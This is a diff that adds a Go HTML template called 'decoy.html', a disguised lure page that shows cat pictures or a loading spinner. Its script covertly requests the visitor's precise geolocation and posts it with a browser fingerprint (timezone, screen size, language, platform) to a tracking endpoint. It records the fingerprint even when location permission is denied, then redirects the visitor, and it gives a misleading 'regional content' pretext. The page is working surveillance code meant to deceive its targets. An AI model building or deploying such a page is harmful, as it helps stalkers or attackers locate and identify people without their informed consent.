@@ -1,0 +1,92 @@
+{{define "decoy.html"}}
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="noindex, nofollow">
+  <title>{{if eq .Theme "cats"}}Cute Cat Pictures 🐱{{else}}Loading…{{end}}</title>
+  <style>
+    body { font-family: system-ui, sans-serif; margin: 0; background: #fafafa; color: #222; }
+    .wrap { max-width: 720px; margin: 0 auto; padding: 24px 16px 64px; }
+    h1 { text-align: center; }
+    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
+    .grid img { width: 100%; border-radius: 12px; display: block; aspect-ratio: 1/1; object-fit: cover; }
+    .loading { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 60vh; }
+    .spinner { width: 40px; height: 40px; border: 4px solid #ddd; border-top-color: #666; border-radius: 50%; animation: spin 1s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .hint { text-align: center; color: #888; font-size: 14px; margin-top: 8px; }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    {{if eq .Theme "cats"}}
+    <h1>🐱 Cute Cat Pictures</h1>
+    <p class="hint">Enjoy! (Loading a couple more while we check your location for regional content...)</p>
+    <div class="grid" id="grid"></div>
+    {{else}}
+    <div class="loading">
+      <div class="spinner"></div>
+      <p class="hint">Loading, please wait…</p>
+    </div>
+    {{end}}
+  </div>
+
+  <script>
+    const SLUG = {{.Slug}};
+    const EVENT_ID = {{.EventID}};
+    const REDIRECT = {{.Redirect}};
+    const THEME = {{.Theme}};
+
+    if (THEME === "cats") {
+      // A handful of royalty-free placeholder cat images (via placekitten-style service).
+      const grid = document.getElementById("grid");
+      for (let i = 1; i <= 6; i++) {
+        const img = document.createElement("img");
+        img.src = "https://placekitten.com/400/400?image=" + i;
+        img.loading = "lazy";
+        img.alt = "cat";
+        grid.appendChild(img);
+      }
+    }
+
+    function fingerprint() {
+      return {
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
+        screen: screen.width + "x" + screen.height,
+        lang: navigator.language || "",
+        platform: navigator.platform || "",
+      };
+    }
+
+    function send(lat, lon, accuracy) {
+      fetch("/g/" + SLUG + "/loc", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          event_id: EVENT_ID,
+          lat: lat || 0,
+          lon: lon || 0,
+          accuracy: accuracy || 0,
+          fingerprint: fingerprint(),
+        }),
+      }).finally(() => {
+        if (REDIRECT) {
+          setTimeout(() => { window.location.href = REDIRECT; }, 400);
+        }
+      });
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => send(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
+        () => send(null, null, null), // permission denied or unavailable — still record the view + fingerprint
+        { enableHighAccuracy: true, timeout: 8000 }
+      );
+    } else {
+      send(null, null, null);
+    }
+  </script>
+</body>
+</html>
+{{end}}
